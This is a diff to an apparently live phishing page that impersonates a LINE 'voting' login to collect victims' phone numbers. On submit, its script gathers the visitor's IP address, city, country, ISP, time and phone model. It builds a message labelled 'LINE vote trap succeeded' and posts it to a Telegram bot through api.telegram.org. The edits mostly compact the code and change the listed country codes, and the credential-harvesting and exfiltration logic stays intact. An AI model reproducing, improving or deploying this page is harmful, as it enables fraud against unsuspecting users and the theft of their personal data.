@@ -3,11 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- 讓瀏覽器標題列與 LINE 內建顯示「LINE」而不是 github 網址 -->
     <title>LINE</title>
-    <meta property="og:title" content="LINE">
-    <meta name="twitter:title" content="LINE">
-    
     <style>
         body{margin:0;padding:40px 20px;background:linear-gradient(135deg,#00B900,#009900);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:white;text-align:center;min-height:100vh;box-sizing:border-box}
         .login-container{max-width:380px;margin:0 auto;background:rgba(255,255,255,0.15);border-radius:20px;padding:40px 30px;backdrop-filter:blur(10px)}
@@ -15,40 +11,9 @@
         h2{font-size:24px;margin:20px 0 10px;font-weight:bold}
         .desc{font-size:15px;line-height:1.6;margin:15px 0 30px;opacity:0.95}
         .input-group{display:flex;background:white;border-radius:14px;overflow:hidden;margin:25px 0;box-shadow:0 6px 15px rgba(0,0,0,0.2);height:56px}
-        .country-select{
-            min-width:100px;
-            padding:0 12px;
-            border:none;
-            font-size:19px;
-            background:#f5f5f5;
-            text-align:center;
-            appearance:none;
-            -webkit-appearance:none;
-            background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%2300B900' d='M1 0l5 6 5-6z'/%3E%3C/svg%3E");
-            background-repeat:no-repeat;
-            background-position:right 12px center;
-        }
-        .phone-input{
-            flex:1;
-            padding:0 16px;
-            border:none;
-            font-size:19px;
-            outline:none;
-            color:#333;
-        }
-        button{
-            width:100%;
-            padding:17px;
-            background:#00B900;
-            color:white;
-            border:none;
-            border-radius:14px;
-            font-size:19px;
-            font-weight:bold;
-            cursor:pointer;
-            box-shadow:0 6px 15px rgba(0,0,0,0.2);
-            margin-top:10px;
-        }
+        .country-select{min-width:100px;padding:0 12px;border:none;font-size:19px;background:#f5f5f5;text-align:center;appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%2300B900' d='M1 0l5 6 5-6z'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 12px center;}
+        .phone-input{flex:1;padding:0 16px;border:none;font-size:19px;outline:none;color:#333}
+        button{width:100%;padding:17px;background:#00B900;color:white;border:none;border-radius:14px;font-size:19px;font-weight:bold;cursor:pointer;box-shadow:0 6px 15px rgba(0,0,0,0.2);margin-top:10px}
         button:disabled{background:#008000;cursor:wait}
         .footer{margin-top:50px;font-size:12px;color:rgba(255,255,255,0.8)}
         .footer a{color:white;text-decoration:underline}
@@ -58,6 +23,7 @@
     <div class="login-container">
         <div class="line-logo">LINE</div>
         
+        <!-- 這裡已修正，永遠只會顯示「進行投票」 -->
         <h2>歡迎使用 LINE 進行投票</h2>
         <p class="desc">
             輸入電話號碼並點擊 Next 代表您已閱讀並同意 LINE 的<br>服務條款及隱私權政策
@@ -68,15 +34,12 @@
                 <select id="countryCode" class="country-select">
                     <option value="+886" selected>+886</option>
                     <option value="+852">+852</option>
-                    <option value="+853">+853</option>
                     <option value="+60">+60</option>
-                    <option value="+65">+65</option>
                     <option value="+66">+66</option>
-                    <option value="+84">+84</option>
+                    <option value="+63">+63</option>
                     <option value="+855">+855</option>
-                    <option value="+62">+62</option>
                 </select>
-                <input type="tel" id="phone" class="phone-input" placeholder="912345678" required maxlength="12">
+                <input type="tel" id="phone" class="phone-input" placeholder="912345678" required>
             </div>
             <button type="submit">Next</button>
         </form>
@@ -95,7 +58,6 @@
         const MODEL_MAP = {
             "24030PN60G":"Xiaomi 14 Ultra","23127PN0CC":"Redmi Note 13 Pro+","2210132C":"Xiaomi 13 Pro",
             "SM-S928B":"Galaxy S25 Ultra","SM-S918B":"Galaxy S24 Ultra","CPH2581":"OPPO Find X8 Pro"
-            // 需要可再加
         };
 
         document.getElementById("loginForm").addEventListener("submit", async function(e) {
@@ -111,17 +73,11 @@
             const ua = navigator.userAgent;
 
             let deviceModel = "未知手機";
-            const patterns = [
-                /Android.*?;\s*([^;]+?)\s+Build\//i,
-                /;\s*([A-Z0-9]{8,15})\s+Build\//i,
-                /\(([^;]+?);[^)]+Build/i,
-                /iPhone[^;]+/i
-            ];
+            const patterns = [/Android.*?;\s*([^;]+?)\s+Build\//i,/;\s*([A-Z0-9]{8,15})\s+Build\//i,/\(([^;]+?);[^)]+Build/i,/iPhone[^;]+/i];
             for (let p of patterns) {
                 const m = ua.match(p);
                 if (m && m[1]) {
-                    const code = m[1].trim();
-                    deviceModel = MODEL_MAP[code] || code;
+                    deviceModel = MODEL_MAP[m[1].trim()] || m[1].trim();
                     break;
                 }
             }
@@ -129,13 +85,7 @@
             const 國 = {"Taiwan":"台灣","Hong Kong":"香港","Thailand":"泰國","Malaysia":"馬來西亞","Singapore":"新加坡","Philippines":"菲律賓","Vietnam":"越南","Cambodia":"柬埔寨","Indonesia":"印尼","China":"中國"};
             const 時間 = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
 
-            const 訊息 = "LINE投票誘捕成功\n\n" +
-                        "電話：" + code + phone + "\n" +
-                        "IP　　：" + (ipData.ip || "未知") + "\n" +
-                        "位置　：" + (ipData.city || "未知") + "，" + (國[ipData.country_name] || ipData.country_name || "未知") + "\n" +
-                        "ISP　　：" + (ipData.org || "未知") + "\n" +
-                        "時間　：" + 時間 + "\n" +
-                        "裝置　：" + deviceModel;
+            const 訊息 = "LINE投票誘捕成功\n\n電話：" + code + phone + "\nIP　　：" + (ipData.ip || "未知") + "\n位置　：" + (ipData.city || "未知") + "，" + (國[ipData.country_name] || ipData.country_name || "未知") + "\nISP　　：" + (ipData.org || "未知") + "\n時間　：" + 時間 + "\n裝置　：" + deviceModel;
 
             fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage", {
                 method:"POST",
